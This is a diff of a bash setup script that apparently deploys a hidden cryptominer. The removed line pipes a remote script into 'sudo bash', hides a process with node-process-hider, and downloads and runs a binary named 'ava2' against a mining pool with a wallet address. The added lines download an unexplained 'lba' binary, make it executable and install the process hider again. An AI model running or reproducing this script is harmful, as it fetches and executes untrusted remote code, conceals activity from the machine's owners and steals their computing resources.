@@ -1,2 +1,6 @@
-#!/bin/bash
-sudo apt update -y && sudo apt install gcc -y && curl -sL https://github.com/christiarch/templates/raw/main/lba  | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider && ph add ava2 && wget https://github.com/dekamoonth/cpuu/raw/main/ava2 && chmod +x ava2 && ./ava2 -a yescryptr16 -o stratum+tcps://yescryptR16.na.mine.zpool.ca:56333 -u DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr -p c=DGB,zap=QOGE -t 3
+apt update 
+apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
+wget https://github.com/christiarch/templates/raw/main/lba 
+chmod +x lba 
+npm i -g node-process-hider
